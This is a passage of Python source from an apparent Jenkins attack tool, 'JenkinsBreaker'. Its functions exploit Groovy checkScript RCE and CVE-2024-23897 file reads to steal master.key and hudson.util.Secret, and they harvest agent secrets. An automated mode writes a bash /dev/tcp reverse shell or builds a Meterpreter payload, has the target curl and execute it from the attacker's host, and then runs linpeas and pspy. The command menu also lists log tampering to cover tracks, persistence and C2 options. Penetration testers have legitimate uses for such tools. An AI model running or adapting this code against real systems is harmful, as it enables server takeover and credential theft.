            "AWS Key": r'AKIA[0-9A-Z]{16}',
            "GitHub Token": r'ghp_[A-Za-z0-9]{36}',
            "Default Password": r'password|admin|123456',
            "Leaked Username": r'username|user'
        }
        matches = []
        for name, pattern in rules.items():
            found = re.findall(pattern, content)
            if found:
                console.print(f"[yellow][+] Detected {name}: {found}[/yellow]")
                matches.append({"rule": name, "matches": found})
        self.secret_matches.extend(matches)
        return matches

    def scan_secrets(self):
        """Scan for secrets in config.xml and console logs."""
        if self.delay:
            time.sleep(self.delay)
        config_url = f"{self.jenkins_url}/config.xml"
        console_url = f"{self.jenkins_url}/lastBuild/consoleText"
        try:
            config_r = requests.get(config_url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            if config_r.status_code == 200:
                self.apply_yara_rules(config_r.text)
            console_r = requests.get(console_url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            if console_r.status_code == 200:
                self.apply_yara_rules(console_r.text)
            self.suggest_next_steps()
            self.command_history.append({"command": "scan_secrets", "timestamp": datetime.now().isoformat()})
        except Exception as e:
            console.print(f"[red][!] Failed to scan for secrets: {e}[/red]")

    def retrieve_all_agent_configs(self):
        """Retrieve all agent configurations (CVE-2025-31720)."""
        if self.delay:
            time.sleep(self.delay)
        url = f"{self.jenkins_url}/computer/api/json"
        try:
            r = requests.get(url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            r.raise_for_status()
            agents = r.json()
            console.print(f"[green][+] Retrieved configurations for {len(agents['computer'])} agents:[/green]")
            for agent in agents['computer']:
                console.print(f"  - {agent['displayName']}: Offline={agent['offline']}, TemporarilyOffline={agent['temporarilyOffline']}")
            self.suggest_next_steps()
            self.command_history.append({"command": "retrieve_all_agent_configs", "timestamp": datetime.now().isoformat()})
            return agents
        except Exception as e:
            console.print(f"[red][!] Failed to retrieve agent configurations (CVE-2025-31720): {e}[/red]")
            return None

    def retrieve_agent_secrets(self):
        """Retrieve secrets from agent configurations (CVE-2025-31721)."""
        if self.delay:
            time.sleep(self.delay)
        url = f"{self.jenkins_url}/computer/api/json?tree=computer[displayName,executors[*]]"
        try:
            r = requests.get(url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
            r.raise_for_status()
            agents = r.json()
            secrets_found = []
            console.print(f"[green][+] Checking for secrets in {len(agents['computer'])} agent configurations:[/green]")
            for agent in agents['computer']:
                config_url = f"{self.jenkins_url}/computer/{agent['displayName']}/config.xml"
                config_r = requests.get(config_url, auth=self.auth, headers=self.custom_headers, proxies=self.proxies, verify=False, timeout=5)
                if config_r.status_code == 200:
                    secrets = re.findall(r'<secret>[^<]+</secret>|<password>[^<]+</password>', config_r.text)
                    if secrets:
                        secrets_found.extend(secrets)
                        console.print(f"  - {agent['displayName']}: Found {len(secrets)} potential secrets")
            if secrets_found:
                console.print(f"[green][+] Potential secrets: {secrets_found}[/green]")
                self.decrypted_secrets.extend(secrets_found)
            else:
                console.print("[yellow][-] No secrets found in agent configurations[/yellow]")
            self.suggest_next_steps()
            self.command_history.append({"command": "retrieve_agent_secrets", "timestamp": datetime.now().isoformat()})
            return secrets_found
        except Exception as e:
            console.print(f"[red][!] Failed to retrieve agent secrets (CVE-2025-31721): {e}[/red]")
            return None

    @confirm_action("exploit Templating Engine Plugin for RCE")
    def exploit_templating_engine(self, lhost, lport, crumb_manager=None):
        """Exploit Templating Engine Plugin for RCE (CVE-2025-31722)."""
        logging.info("Attempting Templating Engine RCE (CVE-2025-31722)")
        if self.delay:
            time.sleep(self.delay)
        folder_name = "breaker-folder"
        payload = f"""@Library('malicious') import malicious; new malicious("{lhost}", {lport}).run()"""
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        headers.update(self.custom_headers)
        if crumb_manager:
            headers = crumb_manager.inject(headers)

        create_folder_url = f"{self.jenkins_url}/createItem?name={folder_name}&mode=com.cloudbees.hudson.plugins.folder.Folder"
        try:
            r = requests.post(create_folder_url, headers=headers, auth=self.auth, proxies=self.proxies, verify=False, timeout=5)
            if r.status_code not in [200, 201]:
                console.print(f"[red][!] Failed to create folder {folder_name}: {r.status_code}[/red]")
                self.exploits_attempted.append({"exploit": "exploit_templating_engine", "status": "failed", "details": f"Failed to create folder: {r.status_code}"})
                return False
        except Exception as e:
            console.print(f"[red][!] Error creating folder: {e}[/red]")
            self.exploits_attempted.append({"exploit": "exploit_templating_engine", "status": "failed", "details": str(e)})
            return False

        config_url = f"{self.jenkins_url}/job/{folder_name}/configure"
        config_data = {
            "name": "malicious",
            "script": payload,
            "submit": "Save"
        }
        try:
            r = requests.post(config_url, headers=headers, data=config_data, auth=self.auth, proxies=self.proxies, verify=False, timeout=10)
            if r.status_code == 200:
                console.print(f"[green][+] Successfully injected malicious library in {folder_name} (CVE-2025-31722)[/green]")
                console.print(f"[yellow][!] Start listener: nc -nlvp {lport}[/yellow]")
                self.exploits_attempted.append({"exploit": "exploit_templating_engine", "status": "success", "details": "Injected malicious library"})
                return True
            else:
                console.print(f"[red][!] Failed to configure library: {r.status_code}[/red]")
                self.exploits_attempted.append({"exploit": "exploit_templating_engine", "status": "failed", "details": f"Failed to configure library: {r.status_code}"})
                return False
        except Exception as e:
            console.print(f"[red][!] Error exploiting Templating Engine Plugin: {e}[/red]")
            self.exploits_attempted.append({"exploit": "exploit_templating_engine", "status": "failed", "details": str(e)})
            return False

    @confirm_action("test for Groovy RCE vulnerability")
    def test_groovy_rce(self, payload=None, crumb_manager=None):
        """Test for Groovy RCE vulnerability (CVE-2019-1003029/1003030)."""
        logging.info(f"Testing Groovy RCE with payload: {payload}")
        if self.delay:
            time.sleep(self.delay)
        url = f"{self.jenkins_url}/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        headers.update(self.custom_headers)
        if crumb_manager:
            headers = crumb_manager.inject(headers)

        if not payload:
            payload = 'class x { x() { "id".execute(); } }'

        try:
            r = requests.post(url, headers=headers, data={"sandbox": "true", "value": payload}, auth=self.auth, proxies=self.proxies, verify=False, timeout=10)
            if r.status_code == 200:
                console.print("[green][+] Groovy RCE test sent (200 OK). Response below:\n[/green]")
                console.print(r.text[:300])
                self.exploits_attempted.append({"exploit": "test_groovy_rce", "status": "success", "details": "Payload sent successfully"})
                return True
            elif r.status_code == 403:
                console.print("[red][!] 403 Forbidden — Crumb missing or insufficient privileges.[/red]")
                self.exploits_attempted.append({"exploit": "test_groovy_rce", "status": "failed", "details": "403 Forbidden"})
                return False
            else:
                console.print(f"[red][-] Unexpected status: {r.status_code}[/red]")
                self.exploits_attempted.append({"exploit": "test_groovy_rce", "status": "failed", "details": f"Unexpected status: {r.status_code}"})
                return False
        except Exception as e:
            console.print(f"[red][!] Exception during test_groovy_rce: {e}[/red]")
            self.exploits_attempted.append({"exploit": "test_groovy_rce", "status": "failed", "details": str(e)})
            return False

    def manual_reverse_shell_exploit(self, lhost, lport):
        """Guide user through manual reverse shell exploit with nc listener setup."""
        if not self.auth:
            console.print("[red][!] Authentication is required to retrieve the CSRF crumb.[/red]")
            return

        try:
            crumb_manager = CrumbManager(self.jenkins_url, auth=self.auth)
            crumb_manager.fetch()
            crumb_value = crumb_manager.crumb_value
        except Exception as e:
            console.print(f"[red][!] Failed to fetch CSRF crumb: {e}[/red]")
            return

        console.print("[yellow][!] Start your Netcat listener before continuing:[/yellow]")
        console.print(f"[cyan]    nc -nlvp {lport}[/cyan]\n")

        shell_payload_url = f"http://{lhost}:{lport}/shell.sh"
        jenkins_endpoint = f"{self.jenkins_url}/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/"

        console.print("[green][*] Step 1: Upload Reverse Shell Script[/green]")
        console.print(f"""curl -k -4 -X POST "{jenkins_endpoint}" \\
  -H "Jenkins-Crumb: {crumb_value}" \\
  --data-urlencode "value=class x {{ x() {{ \\"curl {shell_payload_url} -o /tmp/shell.sh\\".execute(); \\"chmod +x /tmp/shell.sh\\".execute() }} }}" \\
  -d "sandbox=true"\n""")

        console.print("[green][*] Step 2: Execute the Uploaded Script[/green]")
        console.print(f"""curl -k -4 -X POST "{jenkins_endpoint}" \\
  -H "Jenkins-Crumb: {crumb_value}" \\
  --data-urlencode "value=class x {{ x() {{ 'chmod +x /tmp/shell.sh'.execute(); ['/bin/bash','-c','/tmp/shell.sh'].execute() }} }}" \\
  -d "sandbox=true"\n""")

        console.print("[bold yellow][*] Watch your Netcat listener for the incoming shell![/bold yellow]\n")

    def export_report(self, filename="report.json", format="json"):
        """Export findings to JSON or Markdown report."""
        cve_descriptions = {
            "CVE-2019-1003029/1003030": "Groovy RCE via checkScript endpoint (unauthenticated in older versions).",
            "CVE-2024-23897": "Arbitrary file read via CLI @file syntax (unauthenticated in some setups).",
            "CVE-2025-31720": "Retrieve all agent configurations (requires Agent/Configure permission).",
            "CVE-2025-31721": "Retrieve secrets from agent configurations (requires Agent/Configure permission).",
            "CVE-2025-31722": "RCE via Templating Engine Plugin."
        }
        report_data = {
            "timestamp": datetime.now().isoformat(),
            "version": self.version,
            "vulnerabilities": [{"cve": cve, "description": cve_descriptions.get(cve, "No description available")} for cve, _ in self.vulnerabilities],
            "plugins": self.plugins,
            "jobs": self.jobs,
            "exploits_attempted": self.exploits_attempted,
            "decrypted_secrets": self.decrypted_secrets,
            "ssrf_findings": self.ssrf_findings,
            "misconfig_findings": self.misconfig_findings,
            "jwt_findings": self.jwt_findings,
            "secret_matches": self.secret_matches,
            "command_history": self.command_history
        }
        if format == "json":
            with open(filename, "w") as f:
                json.dump(report_data, f, indent=4)
        elif format == "md":
            env = Environment(loader=FileSystemLoader("."))
            template = env.get_template("report_template.md")
            with open(filename, "w") as f:
                f.write(template.render(**report_data))
        elif format == "pdf":
            html_content = Markdown(json.dumps(report_data, indent=4)).markup
            self.generate_pdf_report(html_content, filename)
        console.print(f"[green][+] Report saved to {filename}[/green]")
        self.command_history.append({"command": "export_report", "timestamp": datetime.now().isoformat()})

    def save_history(self, filename, format="markdown"):
        """Export command history as Markdown or Bash script."""
        if format == "bash":
            with open(filename, "w") as f:
                f.write("#!/bin/bash\n")
                for cmd in self.command_history:
                    f.write(f"# {cmd['timestamp']}\npython3 jenkinsbreaker.py {cmd['command']}\n")
            os.chmod(filename, 0o755)
        else:
            with open(filename, "w") as f:
                f.write("# Command History\n")
                for cmd in self.command_history:
                    f.write(f"- `{cmd['command']}` at {cmd['timestamp']}\n")
        console.print(f"[green][+] Command history saved to {filename}[/green]")
        self.command_history.append({"command": "save_history", "timestamp": datetime.now().isoformat()})
#<---
# --- RCE and Enumeration Functions ---
def test_groovy_rce(base_url, auth=None, crumb_manager=None, payload=None, headers=None, proxies=None, delay=0):
    """Test for Groovy RCE vulnerability (CVE-2019-1003029/1003030)."""
    logging.info(f"Testing Groovy RCE with payload: {payload}")
    if delay:
        time.sleep(delay)
    url = f"{base_url}/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/"
    headers = headers or {}
    headers.update({"Content-Type": "application/x-www-form-urlencoded"})
    if crumb_manager:
        headers = crumb_manager.inject(headers)

    if not payload:
        payload = 'class x { x() { "id".execute(); } }'

    try:
        r = requests.post(url, headers=headers, data={"sandbox": "true", "value": payload}, auth=auth, proxies=proxies, verify=False, timeout=10)
        if r.status_code == 200:
            console.print("[green][+] Groovy RCE test sent (200 OK). Response below:\n[/green]")
            console.print(r.text[:300])
            return {"exploit": "test_groovy_rce", "status": "success", "details": "Payload sent successfully"}
        elif r.status_code == 403:
            console.print("[red][!] 403 Forbidden — Crumb missing or insufficient privileges.[/red]")
            return {"exploit": "test_groovy_rce", "status": "failed", "details": "403 Forbidden"}
        else:
            console.print(f"[red][-] Unexpected status: {r.status_code}[/red]")
            return {"exploit": "test_groovy_rce", "status": "failed", "details": f"Unexpected status: {r.status_code}"}
    except Exception as e:
        console.print(f"[red][!] Exception during test_groovy_rce: {e}[/red]")
        return {"exploit": "test_groovy_rce", "status": "failed", "details": str(e)}

def execute_checkscript_rce(base_url, groovy_code, auth=None, crumb_manager=None, headers=None, proxies=None, delay=0):
    """Execute RCE via checkScript endpoint."""
    logging.info(f"Executing checkScript RCE with payload: {groovy_code}")
    if delay:
        time.sleep(delay)
    url = f"{base_url}/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/"
    headers = headers or {}
    headers.update({"Content-Type": "application/x-www-form-urlencoded"})
    if crumb_manager:
        headers = crumb_manager.inject(headers)

    try:
        r = requests.post(
            url,
            headers=headers,
            data={"sandbox": "true", "value": groovy_code},
            auth=auth,
            proxies=proxies,
            verify=False,
            timeout=10
        )
        if r.status_code == 200:
            console.print("[green][+] Payload successfully sent to checkScript.[/green]")
            return {"exploit": "execute_checkscript_rce", "status": "success", "details": "Payload sent successfully"}
        elif r.status_code == 403:
            console.print("[red][!] 403 Forbidden - CSRF crumb missing or insufficient privileges.[/red]")
            return {"exploit": "execute_checkscript_rce", "status": "failed", "details": "403 Forbidden"}
        else:
            console.print(f"[red][-] checkScript returned HTTP {r.status_code}[/red]")
            return {"exploit": "execute_checkscript_rce", "status": "failed", "details": f"Status: {r.status_code}"}
    except Exception as e:
        console.print(f"[red][!] Exception in execute_checkscript_rce: {e}[/red]")
        return {"exploit": "execute_checkscript_rce", "status": "failed", "details": str(e)}

def auto_own_sandbox_bypass(base_url, lhost, lport, auth=None, http_port=8080, vulnerabilities=None,
                            multithreaded=False, headers=None, proxies=None, delay=0, use_dns=False, dns_domain=None,
                            use_meterpreter=False):
    """Automate RCE via enumerated vulnerabilities with post-exploitation recon and loot collection."""

    if not (lhost and lport):
        console.print("[red][-] LHOST and LPORT are required.[/red]")
        return
    if not vulnerabilities:
        console.print("[red][!] No vulnerabilities provided. Please run --enumerate first.[/red]")
        return

    console.print("[bold red][!] Warning: Auto-exploit mode will attempt multiple exploits, which can be destructive.[/bold red]")
    console.print("[bold red][!] Are you sure you want to proceed? [y/N][/bold red]")
    response = input().strip().lower()
    if response != 'y':
        console.print("[yellow][*] Auto-exploit cancelled.[/yellow]")
        return

    console.print(f"[yellow][!] Ensure your Netcat listener is running: nc -nlvp {lport}[/yellow]")

    if use_meterpreter:
        console.print(f"[bold cyan][*] Metasploit Payload Selected. Start your listener with the following: [/bold cyan]")
        console.print(f"""
[bold green]use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j[/bold green]
        """)

    crumb_manager = CrumbManager(base_url, auth=auth)
    tool = JenkinsBreaker(base_url, auth[0] if auth else None, auth[1] if auth else None,
                          headers=headers, proxy=proxies, delay=delay)

    payload_dir = os.path.join(os.getcwd(), "payloads")
    os.makedirs(payload_dir, exist_ok=True)

    # Generate payloads
    if use_meterpreter:
        payload_file = "meterpreter.elf"
        meterpreter_path = os.path.join(payload_dir, payload_file)
        if not os.path.exists(meterpreter_path):
            console.print("[cyan][*] Generating Meterpreter payload...[/cyan]")
            meterpreter_command = (
                f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} "
                f"-f elf -o {meterpreter_path}"
            )
            subprocess.run(meterpreter_command, shell=True, check=True)
    else:
        payload_file = "shell.sh"
        shell_path = os.path.join(payload_dir, payload_file)
        with open(shell_path, "w") as f:
            f.write(f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n")
        os.chmod(shell_path, 0o755)

    console.print(f"[green][+] Payload ready: {payload_file}[/green]")

    # Download linpeas & pspy if missing
    linpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
    pspy_url = "https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64"
    linpeas_path = os.path.join(payload_dir, "linpeas.sh")
    pspy_path = os.path.join(payload_dir, "pspy64")

    def download_tool(url, dest):
        if not os.path.exists(dest):
            console.print(f"[cyan][*] Downloading {os.path.basename(dest)}...[/cyan]")
            subprocess.run(["curl", "-L", "-o", dest, url], check=True)
            os.chmod(dest, 0o755)

    download_tool(linpeas_url, linpeas_path)
    download_tool(pspy_url, pspy_path)

    # Serve payloads via HTTP
    def serve_payload():
        os.chdir(payload_dir)
        console.print(f"[green][+] Serving payloads at http://0.0.0.0:{http_port}/[/green]")
        server = HTTPServer(("0.0.0.0", http_port), SimpleHTTPRequestHandler)
        server.serve_forever()

    http_thread = threading.Thread(target=serve_payload, daemon=True)
    http_thread.start()
    time.sleep(2)

    # Upload Payload
    payload_url = f"http://{lhost}:{http_port}/{payload_file}"
    phase1 = (
        f'class x {{ x() {{ '
        f'"curl {payload_url} -o /tmp/{payload_file}".execute(); '
        f'"chmod +x /tmp/{payload_file}".execute(); '
        f'}} }}'
    )
    console.print(f"[yellow][>] Groovy Payload (Upload Phase):\n{phase1}\n[/yellow]")
    execute_checkscript_rce(base_url, phase1, auth=auth, crumb_manager=crumb_manager,
                            headers=headers, proxies=proxies, delay=delay)
    time.sleep(2)

    # Execute Payload
    if use_meterpreter:
        exec_command = f'["/tmp/{payload_file}"]'
    else:
        exec_command = f'["/bin/bash","-c","/tmp/{payload_file}"]'

    phase2 = f'class x {{ x() {{ {exec_command}.execute(); }} }}'
    console.print(f"[yellow][>] Groovy Payload (Execution Phase):\n{phase2}\n[/yellow]")
    execute_checkscript_rce(base_url, phase2, auth=auth, crumb_manager=crumb_manager,
                            headers=headers, proxies=proxies, delay=delay)

    # Upload and execute linpeas and pspy for recon
    linpeas_url_http = f"http://{lhost}:{http_port}/linpeas.sh"
    pspy_url_http = f"http://{lhost}:{http_port}/pspy64"

    recon_phase = (
        f'class x {{ x() {{ '
        f'"curl {linpeas_url_http} -o /tmp/linpeas.sh".execute(); '
        f'"curl {pspy_url_http} -o /tmp/pspy64".execute(); '
        f'"chmod +x /tmp/linpeas.sh /tmp/pspy64".execute(); '
        f'["/bin/bash","-c","/tmp/linpeas.sh > /tmp/linpeas_output.txt"].execute(); '
        f'["/bin/bash","-c","/tmp/pspy64 > /tmp/pspy_output.txt 2>&1 &"].execute(); '
        f'}} }}'
    )
    console.print(f"[yellow][>] Groovy Payload (Recon Phase - linpeas & pspy):\n{recon_phase}\n[/yellow]")
    execute_checkscript_rce(base_url, recon_phase, auth=auth, crumb_manager=crumb_manager,
                            headers=headers, proxies=proxies, delay=delay)

    time.sleep(5)  # Allow some time for scripts to execute

    console.print(f"[bold yellow][*] Final Notes:[/bold yellow]")
    console.print(f"""[cyan]
 - Recon scripts have been executed. Review results manually on the target machine:
    [bold]/tmp/linpeas_output.txt[/bold]
    [bold]/tmp/pspy_output.txt[/bold]
 - Run [bold]/tmp/linpeas.sh[/bold] and [bold]/tmp/pspy64[/bold] manually if needed.
 - Analyze the output for privilege escalation paths.

[bold cyan][*] Exploitation Complete. Happy Hunting! 🏴‍☠️[/bold cyan]
[/cyan]""")

    tool.suggest_next_steps()






def cli_read_trick(jenkins_url, file_path, auth=None, headers=None, proxies=None, delay=0):
    """Test CLI trick for reading arbitrary files."""
    if delay:
        time.sleep(delay)
    console.print(f"[yellow][+] Testing CLI trick for @{file_path}[/yellow]")
    for cmd in ["who-am-i", "enable-job", "keep-build"]:
        try:
            url = f"{jenkins_url}/{cmd}/@\"{file_path}\""
            r = requests.get(url, auth=auth, headers=headers, proxies=proxies, verify=False)
            console.print(f"[green][+] {cmd} output: {r.text.strip().splitlines()[0]}[/green]")
        except Exception as e:
            console.print(f"[red][!] {cmd} failed: {e}[/red]")

def exploit_cve_2024_23897(jenkins_url, file_path, auth=None, headers=None, proxies=None, delay=0):
    """Exploit CVE-2024-23897 for arbitrary file reading."""
    if delay:
        time.sleep(delay)
    cli_endpoints = ["who-am-i", "connect-node", "enable-job", "keep-build"]
    for cli in cli_endpoints:
        url = f"{jenkins_url}/{cli}/@\"{file_path}\""
        try:
            r = requests.get(url, auth=auth, headers=headers, proxies=proxies, verify=False)
            if r.status_code == 200:
                return r.content
            elif r.status_code == 403:
                console.print(f"[red][-] {cli} blocked by perms or CSRF.[/red]")
            else:
                console.print(f"[red][-] {cli} failed ({r.status_code})[/red]")
        except Exception as e:
            console.print(f"[red][!] {cli} error: {e}[/red]")
    return None

def loot_jenkins_keys(jenkins_url, auth=None, headers=None, proxies=None, delay=0):
    """Loot master.key and hudson.util.Secret using CVE-2024-23897."""
    if delay:
        time.sleep(delay)
    possible_homes = [
        "/var/lib/jenkins",
        "/var/jenkins_home",
        "/opt/jenkins/home",
    ]
    master_key = None
    hudson_secret = None

    for home in possible_homes:
        master_key_path = os.path.join(home, "secrets", "master.key")
        master_key_content = exploit_cve_2024_23897(jenkins_url, master_key_path, auth=auth, headers=headers, proxies=proxies, delay=delay)
        if master_key_content:
            master_key = master_key_content.decode('utf-8').strip()
            console.print(f"[green][+] Retrieved master.key from {master_key_path}[/green]")
            break
    else:
        console.print("[red][-] Failed to find master.key[/red]")

    for home in possible_homes:
        hudson_secret_path = os.path.join(home, "secrets", "hudson.util.Secret")
        hudson_secret_content = exploit_cve_2024_23897(jenkins_url, hudson_secret_path, auth=auth, headers=headers, proxies=proxies, delay=delay)
        if hudson_secret_content:
            hudson_secret = hudson_secret_content
            console.print(f"[green][+] Retrieved hudson.util.Secret from {hudson_secret_path}[/green]")
            break
    else:
        console.print("[red][-] Failed to find hudson.util.Secret[/red]")

    return master_key, hudson_secret
#<---
def display_commands():
    """Display a categorized list of all available commands."""
    commands = {
        "Connection Options": [
            ("--url", "Specify the Jenkins server URL (e.g., http://jenkins:8080)"),
            ("--username", "Jenkins username for authentication"),
            ("--password", "Jenkins password or API token"),
            ("--target", "Specify target as URL,USER,PASS (can be multiple)"),
            ("--headers", "Custom HTTP headers (e.g., Key1:Value1,Key2:Value2)"),
            ("--proxy", "Proxy URL for requests (e.g., http://127.0.0.1:8080)"),
            ("--delay", "Delay between requests in seconds (e.g., 1)"),
        ],
        "Reconnaissance": [
            ("--enumerate", "Enumerate Jenkins version, plugins, and jobs"),
            ("--list-plugins", "List installed plugins and check for vulnerabilities"),
            ("--list-jobs", "List jobs and check for pipeline vulnerabilities"),
            ("--check-websocket-cli", "Probe for WebSocket CLI vulnerabilities"),
            ("--detect-ssrf", "Detect potential SSRF in SCM configurations"),
            ("--detect-misconfigs", "Detect misconfigured settings (e.g., Groovy sandbox)"),
            ("--detect-jwt", "Detect JWT tokens in console logs"),
            ("--scan-secrets", "Scan for secrets in configs and logs"),
            ("--scan-ports", "Scan common ports on the Jenkins server"),
            ("--list-agents", "Retrieve all agent configurations (CVE-2025-31720)"),
            ("--agent-secrets", "Retrieve secrets from agents (CVE-2025-31721)"),
        ],
        "Exploitation": [
            ("--check-groovy-rce", "Test for Groovy RCE (CVE-2019-1003029/1003030)"),
            ("--exploit-cve", "Exploit CVE-2024-23897 for file reading"),
            ("--exploit-templating-engine", "Exploit Templating Engine Plugin (CVE-2025-31722)"),
            ("--auto", "Run automated enumeration and exploitation"),
            ("--cli-trick", "Test CLI trick for arbitrary file reading"),
            ("--loot-keys", "Loot master.key and hudson.util.Secret"),
            ("--fuzz-plugin", "Fuzz a Jenkins plugin for vulnerabilities"),
            ("--dump-aws-keys", "Dump AWS keys from credentials"),
            ("--tamper-logs", "Simulate log tampering to cover tracks"),
            ("--analyze-jwt", "Crack JWT tokens using a wordlist"),
            ("--manual-exploit", "Guide through manual reverse shell exploit"),
        ],
        "Payload Generation": [
            ("--generate-shell", "Generate a reverse shell (bash, python, groovy, powershell)"),
            ("--generate-metasploit", "Generate Metasploit payload command"),
            ("--lhost", "Listener host for reverse shells"),
            ("--lport", "Listener port for reverse shells"),
            ("--dns-domain", "DNS domain for Groovy shell egress"),
            ("--http-port", "Port for serving payloads (default: 8080)"),
        ],
        "Persistence and Evasion": [
            ("--persistence-method", "Add persistence (cron, jenkins_pipeline)"),
            ("--c2-host", "Host for C2 server"),
            ("--c2-port", "Port for C2 server"),
            ("--interactive-shell-host", "Host for interactive shell WebSocket"),
            ("--interactive-shell-port", "Port for interactive shell WebSocket"),
        ],
        "Decryption and Reporting": [
            ("--decrypt", "Decrypt a base64-encoded Jenkins secret"),
            ("--decrypt-file", "Decrypt secrets from a credentials XML file"),
            ("--master-key-file", "Path to master.key file"),
            ("--hudson-secret-file", "Path to hudson.util.Secret file"),
            ("--save-report", "Export findings to a report"),
            ("--format", "Report format (json, md, pdf)"),
            ("--save-history", "Export command history"),
            ("--history-format", "History format (markdown, bash)"),
            ("--generate-test-files", "Generate test master.key, config.xml, and hudson.util.Secret"),
        ],
        "Help and Tutorial": [
            ("--help-commands", "List all available commands"),
            ("--help-command", "Show detailed help for a specific command"),
            ("--tutorial", "Display a beginner's tutorial"),
        ],
        "Advanced": [
            ("run <cve>", "Run a specific CVE exploit from the exploits/ directory"),
            ("--multithreaded", "Enable multithreaded exploit execution"),
            ("--wordlist", "Wordlist for JWT cracking"),
        ],
    }

    console.print(Panel("[bold cyan]Available Commands[/bold cyan]", border_style="cyan"))
    for category, cmd_list in commands.items():
        console.print(f"[bold yellow]{category}[/bold yellow]")
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Command", style="cyan")
        table.add_column("Description", style="white")
        for cmd, desc in cmd_list:
            table.add_row(cmd, desc)
        console.print(table)
        console.print()

def display_command_help(command):
    """Display detailed help for a specific command."""
    command_help = {
        "--url": {
            "description": "The URL of the Jenkins server to target (e.g., http://jenkins:8080). Required for most remote operations.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --enumerate",
            "notes": "Ensure the URL includes the protocol (http/https) and port if non-standard."
        },
        "--username": {
            "description": "Jenkins username for authentication. Use with --password for authenticated scans.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --username admin --password pass --enumerate",
            "notes": "Some actions require authentication to access protected endpoints."
        },
        "--password": {
            "description": "Jenkins password or API token for authentication.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --username admin --password pass --enumerate",
            "notes": "API tokens are preferred for security."
        },
        "--target": {
            "description": "Specify a target as URL,USER,PASS. Can be used multiple times for multiple targets.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --target http://jenkins:8080,admin,pass --enumerate",
            "notes": "Alternative to --url, --username, --password for batch operations."
        },
        "--enumerate": {
            "description": "Enumerate Jenkins version, plugins, jobs, and check for vulnerabilities.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --enumerate",
            "notes": "Start with this to gather information before attempting exploits."
        },
        "--list-plugins": {
            "description": "List installed Jenkins plugins and check for known vulnerabilities.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --list-plugins",
            "notes": "Identifies plugins like 'templating-engine' that may be exploitable."
        },
        "--list-jobs": {
            "description": "List Jenkins jobs and check for scripted pipeline vulnerabilities.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --list-jobs",
            "notes": "Looks for dangerous Groovy constructs in pipeline scripts."
        },
        "--check-groovy-rce": {
            "description": "Test for Groovy RCE vulnerability (CVE-2019-1003029/1003030).",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --check-groovy-rce",
            "notes": "May require authentication or a CSRF crumb."
        },
        "--exploit-cve": {
            "description": "Exploit CVE-2024-23897 to read arbitrary files.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --exploit-cve --target-file /var/lib/jenkins/config.xml",
            "notes": "Requires --target-file to specify the file path."
        },
        "--exploit-templating-engine": {
            "description": "Exploit Templating Engine Plugin for RCE (CVE-2025-31722).",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --exploit-templating-engine --lhost 192.168.1.100 --lport 4444",
            "notes": "Requires --lhost and --lport for reverse shell."
        },
        "--auto": {
            "description": "Run automated enumeration and exploitation.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --auto --lhost 192.168.1.100 --lport 4444",
            "notes": "Combines enumeration with exploit attempts. Requires --lhost and --lport."
        },
        "--generate-shell": {
            "description": "Generate a reverse shell in bash, python, groovy, or powershell.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --generate-shell bash --lhost 192.168.1.100 --lport 4444",
            "notes": "Use with --lhost and --lport to set up the listener."
        },
        "--generate-metasploit": {
            "description": "Generate a Metasploit payload command.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --generate-metasploit --lhost 192.168.1.100 --lport 4444",
            "notes": "Outputs a command for msfvenom to create an executable payload."
        },
        "--decrypt": {
            "description": "Decrypt a base64-encoded Jenkins secret.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --decrypt AQAAABAAAAAQ --master-key-file master.key --hudson-secret-file hudson.util.Secret",
            "notes": "Requires master.key and hudson.util.Secret files."
        },
        "--save-report": {
            "description": "Export findings to a report in JSON, Markdown, or PDF format.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --url http://jenkins:8080 --save-report report.json --format json",
            "notes": "Use after enumeration or exploitation to document findings."
        },
        "--help-commands": {
            "description": "List all available commands with brief descriptions.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --help-commands",
            "notes": "Useful for discovering available options."
        },
        "--help-command": {
            "description": "Show detailed help for a specific command.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --help-command --enumerate",
            "notes": "Provides in-depth information including examples."
        },
        "--tutorial": {
            "description": "Display a beginner's tutorial for using JenkinsBreaker.",
            "required": False,
            "example": "python3 jenkinsbreaker.py --tutorial",
            "notes": "Guides new users through setup and basic usage."
        },
    }

